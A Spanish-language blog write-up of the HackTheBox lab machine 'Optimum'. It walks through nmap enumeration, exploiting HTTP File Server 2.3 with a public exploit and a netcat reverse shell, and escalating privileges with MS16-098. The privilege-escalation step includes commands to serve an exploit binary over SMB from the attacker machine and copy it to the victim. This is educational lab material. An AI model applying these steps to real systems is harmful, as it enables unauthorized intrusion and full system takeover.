---
layout: post
title:  "Optimum - HackTheBox - WriteUp/Walkthrough"
summary: "Resolución de la máquina Optimum de Hackthebox"
date: '2021-10-21 10:35:23 +0530'
category: ['hackthebox', 'writeup','walkthrough']
thumbnail: /assets/img/posts/optimum-writeup/Optimum-700x400.webp
keywords: hackthebox, optimum, writeup, walkthrought 
permalink: /blog/optimum-hackthebox-writeup-walkthrough/
author: r4z0r
usemathjax: true
---
Hola amigos, en esta ocasión les traigo un nuevo WriteUp al blog, la máquina Optimum de HackTheBox.

![optimum](/assets/img/posts/optimum-writeup/opti.webp)

## Enumeración


```shell
# ----- Enumeración de puertos -----
 nmap -sS --min-rate 5000 -p- --open -T5 -n -v $ip -oG puertos 
$ip = La ip de la máquina de Optimum (ip=10.10.10.8).
-sS = Escaneo TCP SYN para un escaneo rápido.
–min-rate 5000 = Para no enviar paquetes menores a 5000 por segundo.
-p- = Escanear todos los puertos, 65535.
--open = Filtrar solo por puertos con status open.
-v = Para ir detallando la salida a medida que va encontrando resultados.
-n = Evitar enumeración DNS.
-oG = Para exportarlo a un formato grepeable (de este modo podemos extraer los puertos a través de una función, útil cuando son muchos puertos).
# ----- Enumeración específica ----- 
nmap -sC -sV -p80 $ip -oN svp
-sV = Enumeración de servicios y versiones.  
-sC = Scripts de la categoría default.
-oN = Exportarlo a un formato normal llamado svp.
$ip = La ip de la máquina de Optimum (ip=10.10.10.8).
```
![nmap-ports](/assets/img/posts/optimum-writeup/nmap-optimum.webp "Scan ports with nmap")

![nmap-sc](/assets/img/posts/optimum-writeup/nmap-sc-optimum.webp "Scan scripts, services and versions with nmap")


Como podemos observar, solo tenemos un puerto abierto donde en el cuál corre un servicio llamado HFS ( Servidor de archivos HTTP) . HTTP File Server, es un servidor web gratuito diseñado específicamente para publicar y compartir archivos. Este servidor ya lo habíamos explotado anteriormente en una máquina de TryHackMe..

## Explotación

![hfs](/assets/img/posts/optimum-writeup/hfs.webp "HFS Server")

Ahí podemos ver la versión de HttpFileServer, es la 2.3, cosa que ya nos indicó nmap. Ahora buscaremos un exploit en searchsploit.

![hfs](/assets/img/posts/optimum-writeup/searchsploit.webp "searchsploit")

![rejetto](/assets/img/posts/optimum-writeup/rejjetto.webp "rejetto")

Seleccionamos el exploit 39161.py y lo descargamos

Entramos a investigar el exploit, como ven nos pide que compartamos nc.exe en nuestra máquina cuando vayamos a ejecutar el exploit.

![exploit](/assets/img/posts/optimum-writeup/revshell.webp "modificando el exploit")

Luego más abajo deben cambiar la ip, por la ip de atacante de ustedes y el puerto que van a poner a la escucha.

![exploit](/assets/img/posts/optimum-writeup/revshell2.webp "modificando el exploit")

Pasamos a la explotación, en la ventana superior izquierda vamos a compartir nc.exe, en la ventana derecha ejecutamos el exploit y en la parte >

![ejecutamosexploit](/assets/img/posts/optimum-writeup/accediendo.webp "Accediendo")

En el caso de que el exploit les pida la librería xlrd, a mi me funcionó con ese comando utilizando python2.7.

![pip](/assets/img/posts/optimum-writeup/pip.webp "pip")

Como ven ya estamos dentro de la máquina podemos ya verificar que tenemos un Windows, somos el usuario Kostas y podemos listar la primer bandera, la user,txt.txt

![accediendo](/assets/img/posts/optimum-writeup/ganando acceso.webp "flag user")

## Escalada de Privilegios

Para escalar privilegios vamos a realizar un systeminfo y copiar la información a un ficherito llamado sysinfo.txt, ustedes le dan el nombre que quieren. Ese ficherito luego lo vamos a pasar a la herramienta Suggester, les dejo el link al **[repositorio](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)**. A través de esta herramienta podemos enumerar algunas vulnerabilidades de forma offline, es decir sin necesidad de estar dentro de la máquina, solo con pasarle la información del sistema de la víctima.

![priv-esc](/assets/img/posts/optimum-writeup/sysinfo.webp "sysinfo")

![how to usage](/assets/img/posts/optimum-writeup/howtousage.webp "como usar")

```
# Clonamos el repositorio

git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester

# Nos movemos a la carpeta

cd Windows-Exploit-Suggester

# Actualizamos base de datos

python2.7 windows-exploit-suggester.py --update

# Ejecutamos la herramienta pasándole la base de datos creada y el fichero de información del sistema

python2.7 windows-exploit-suggester.py --database "basededatos" --systeminfo "sysinfo.txt"
```

![suggester](/assets/img/posts/optimum-writeup/suggester.webp "suggester")

![headsysinfo](/assets/img/posts/optimum-writeup/head sysinfo.webp "head sysinfo")

Ejecutamos Suggester

![ejecutamosuggester](/assets/img/posts/optimum-writeup/ejecutamos suggester.webp "ejecutamos suggester")


Tenemos varias vulnerabilidades para explotar, nosotros vamos a utilizar [MS16-098](https://github.com/sensepost/ms16-098). Pueden entrar más a detalles de la vulnerabilidad en el respositorio.

![ms16-098](/assets/img/posts/optimum-writeup/ms16-090.webp "MS16-098")

Deben descargarse el fichero bfill.exe, luego transferirlo a la máquina Windows.

```bash
# máquina atacante
a = nombre recurso compartido, es como el nombre de una carpeta
. = comparto todo lo que hay en el directorio actual, ahí esta bfill.exe
python3 smbserver.py a .
# máquina víctima
copy \\ip-atacante\a\bfill.exe
```

Una vez copiado en fichero en la máquina víctima podemos ya ejecutarlo y escalar privilegios.

![bfill](/assets/img/posts/optimum-writeup/bfill.webp "bfill.exe")

Ya somos nt authority\system, ahora toca leer la bandera de root.

![rootflag](/assets/img/posts/optimum-writeup/root flag.webp "root flag")

**¡Bien, ya resolvimos la máquina, felicidades!**

Espero que te haya gustado este artículo y hayas aprendido mucho.

Compártelo con tus amigos y sigue aprendiendo de este hermoso mundo del hacking, te veo luego.

[R4z0r](https://juankaenel.github.io)


